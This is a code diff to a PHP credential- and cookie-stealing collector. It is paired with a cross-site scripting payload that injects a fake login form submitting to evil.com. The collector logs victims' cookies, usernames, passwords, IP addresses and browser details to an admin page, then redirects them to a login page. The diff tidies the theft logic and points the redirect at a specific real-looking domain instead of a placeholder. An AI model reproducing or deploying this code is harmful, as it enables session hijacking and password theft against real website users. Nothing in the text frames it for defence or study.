@@ -12,7 +12,6 @@ div.innerHTML = '<form name="evil" action="http://evil.com/c/c.php" method="GET"
 document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
 </sCriPt>
 
-
 */
 
 	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
@@ -22,7 +21,7 @@ document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
 		while($ligneActuelle = array_shift($tmp))
 		{
 			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
-			if($ligneActuelle == "<!-- Breakpoint -->\n") //si on rencontre le breakpoint
+			if($ligneActuelle == "<!-- Breakpoint -->\n") 
 			{
 				$newPage .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$data</td><td>$provenance</td></tr>";
 				$newPage .= "\n<!-- Breakpoint -->\n";
@@ -44,14 +43,21 @@ document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
 	$date		= date("d/m/Y");
 	$heure		= date("H:i:s");
 	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
-	if(isset($_GET['c']))	$data	= $_GET['c'];
-	else 					$data	= 'No data on cookie param';
-	
-	if(isset($_GET['uname']))$data	= 'Usuario: ' . $_GET['uname'] . ' - Password: ' . $_GET['psw'];
-	else 					$data	= 'No data on user param';
-	
+	if(isset($_GET['c'])){
+		$data	= $_GET['c'];
+	}	
+	else 
+	{
+		if(isset($_GET['uname'])){
+			$data	= 'Usuario: ' . $_GET['uname'] . ' - Password: ' . $_GET['psw'];
+		}
+		else {
+			$data	= 'No data on user param';
+		}
+	} 	
+
 	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
 	echo "Unauthorized Access";
 	// post "robo" redirection
-	header("Location: http://www.originalsite.com/login.php");
+	header("Location: http://www.murciasalus.es/login.php");
 ?>
